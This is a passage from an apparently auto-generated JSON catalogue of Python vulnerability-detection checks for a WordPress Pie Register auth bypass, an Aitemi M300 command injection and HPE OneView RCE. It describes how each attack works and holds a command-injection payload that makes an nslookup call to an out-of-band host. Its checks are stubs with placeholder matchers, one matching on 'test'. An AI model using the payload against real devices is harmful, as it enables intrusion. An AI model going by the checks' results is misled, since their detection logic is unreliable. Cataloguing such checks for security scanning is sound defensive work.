\"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(set_cookie,\\'wordpress_logged_in_\\'); status_code==302 / [OR] DSL: status_code == 200; contains_all(body, \"Dashboard\",\"Plugins\",\"Edit Profile\")'\n\n        # Simple word matcher simulation\n        matchers = ['wordpress_logged_in_']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Pie Register <= 3.7.1.4 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34077(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34077\nName: WordPress Pie Register <= 3.7.1.4 - Authentication Bypass\nSeverity: critical\nDescription: An authentication bypass vulnerability exists in the WordPress Pie Register plugin ≤ 3.7.1.4 that allows unauthenticated attackers to impersonate arbitrary users by submitting a crafted POST request to the login endpoint. By setting social_site=true and manipulating the user_id_social_site parameter, an attacker can generate a valid WordPress session cookie for any user ID, including administrators.Once authenticated, the attacker may exploit plugin upload functionality to install a malicious plugin containing arbitrary PHP code, resulting in remote code execution on the underlying server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34077:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34077\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Pie Register <= 3.7.1.4 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(set_cookie,\\'wordpress_logged_in_\\'); status_code==302 / [OR] DSL: status_code == 200; contains_all(body, \"Dashboard\",\"Plugins\",\"Edit Profile\")'\n\n        # Simple word matcher simulation\n        matchers = ['wordpress_logged_in_']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Pie Register <= 3.7.1.4 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34077(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "wordpress",
          "wp-plugin",
          "pie-register",
          "wp",
          "auth-bypass",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_34152",
        "name": "Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter",
        "language": "Python",
        "famille": "CVE",
        "description": "An unauthenticated OS command injection vulnerability exists in the Shenzhen Aitemi M300 Wi-Fi Repeater (hardware model MT02) via the 'time' parameter of the '/protocol.csp?' endpoint. The input is processed by the internal date '-s' command without rebooting or disrupting HTTP service. Unlike other injection points, this vector allows remote compromise without triggering visible configuration changes.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(interactsh_protocol, \"dns\"); contains_all(body, \"error\",\"opt\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "`$(nslookup {{interactsh-url}})`"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34152\nName: Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter\nSeverity: critical\nDescription: An unauthenticated OS command injection vulnerability exists in the Shenzhen Aitemi M300 Wi-Fi Repeater (hardware model MT02) via the 'time' parameter of the '/protocol.csp?' endpoint. The input is processed by the internal date '-s' command without rebooting or disrupting HTTP service. Unlike other injection points, this vector allows remote compromise without triggering visible configuration changes.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34152:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34152\"\n    SEVERITY = \"critical\"\n    NAME = \"Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(interactsh_protocol, \"dns\"); contains_all(body, \"error\",\"opt\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34152(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34152\nName: Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter\nSeverity: critical\nDescription: An unauthenticated OS command injection vulnerability exists in the Shenzhen Aitemi M300 Wi-Fi Repeater (hardware model MT02) via the 'time' parameter of the '/protocol.csp?' endpoint. The input is processed by the internal date '-s' command without rebooting or disrupting HTTP service. Unlike other injection points, this vector allows remote compromise without triggering visible configuration changes.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34152:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34152\"\n    SEVERITY = \"critical\"\n    NAME = \"Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(interactsh_protocol, \"dns\"); contains_all(body, \"error\",\"opt\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Shenzhen Aitemi M300 Wi-Fi Repeater – Unauthenticated Remote Command Execution via `time` Parameter\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34152(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "aitemi",
          "m300",
          "wifi",
          "unauth",
          "rce",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_37164",
        "name": "HPE OneView - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "HPE OneView contains a remote code execution vulnerability, letting remote attackers execute arbitrary code.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'ExecutableCommand' | mot(s) 'dns' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-37164\nName: HPE OneView - Remote Code Execution\nSeverity: critical\nDescription: HPE OneView contains a remote code execution vulnerability, letting remote attackers execute arbitrary code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_37164:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-37164\"\n    SEVERITY = \"critical\"\n    NAME = \"HPE OneView - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'ExecutableCommand' | mot(s) 'dns' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['ExecutableCommand', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"HPE OneView - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_37164(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-37164\nName: HPE OneView - Remote Code Execution\nSeverity: critical\nDescription: HPE OneView contains a remote code execution vulnerability, letting remote attackers execute arbitrary code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_37164:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-37164\"\n    SEVERITY = \"critical\"\n    NAME = \"HPE OneView - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in 